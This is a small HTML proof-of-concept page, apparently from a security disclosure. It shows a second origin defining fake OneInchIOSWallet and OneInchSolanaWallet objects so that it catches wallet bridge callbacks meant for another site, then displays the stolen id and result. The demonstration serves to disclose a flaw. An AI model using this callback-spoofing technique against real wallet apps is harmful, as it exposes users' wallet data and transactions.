<!doctype html><meta charset=utf-8><title>Origin B — capture</title>
<style>body{font:16px system-ui;padding:20px}pre{white-space:pre-wrap;word-break:break-all;
background:#ffe9e9;padding:12px;font-size:15px}h2{color:#b00}</style>
<h2>Origin B — never requested anything</h2>
<div id=org></div>
<pre id=o>waiting for a callback that was never meant for this origin…</pre>
<script>
document.getElementById('org').textContent = "location.origin = " + location.origin;
function cap(id, result){
  document.getElementById('o').textContent =
    "*** STOLEN BY ORIGIN B ***\norigin: " + location.origin +
    "\nid: " + id + "\nresult: " + result;
}
window.OneInchIOSWallet   = { init:function(){}, executeCallback: cap };
window.OneInchSolanaWallet= { init:function(){}, executeCallback: cap };
</script>
